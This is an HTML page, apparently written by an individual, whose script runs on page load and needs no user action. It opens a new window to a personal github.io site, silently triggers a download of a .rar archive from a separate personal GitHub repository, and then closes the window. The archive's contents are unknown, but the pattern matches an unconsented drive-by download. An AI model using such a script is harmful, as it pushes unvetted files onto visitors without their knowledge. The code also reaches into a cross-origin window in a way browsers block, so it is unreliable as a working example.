<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic Actions</title>
</head>
<body>
    <script>
        // Lien du fichier index.html dans le référentiel https://github.com/ayoublahdoud/b
        var indexUrl = 'https://ayoublahdoud.github.io/b/';

        // Ouvrir une nouvelle page avec le fichier index.html
        var newWindow = window.open(indexUrl);

        // Attendre que la nouvelle page soit chargée
        newWindow.onload = function() {
            // Lien du fichier .rar dans le référentiel https://github.com/ayoublahdoud/i
            var rarUrl = 'https://github.com/ayoublahdoud/i/archive/main.rar';

            // Créer un lien de téléchargement pour le fichier .rar
            var downloadLink = document.createElement('a');
            downloadLink.href = rarUrl;
            downloadLink.download = 'i_files.rar';

            // Ajouter le lien à la nouvelle page
            newWindow.document.body.appendChild(downloadLink);

            // Cliquez sur le lien pour déclencher le téléchargement
            downloadLink.click();

            // Supprimer le lien de la page après le téléchargement
            newWindow.document.body.removeChild(downloadLink);

            // Fermez la fenêtre après 3 secondes
            setTimeout(function() {
                newWindow.close();
            }, 3000);
        };
    </script>
</body>
</html>
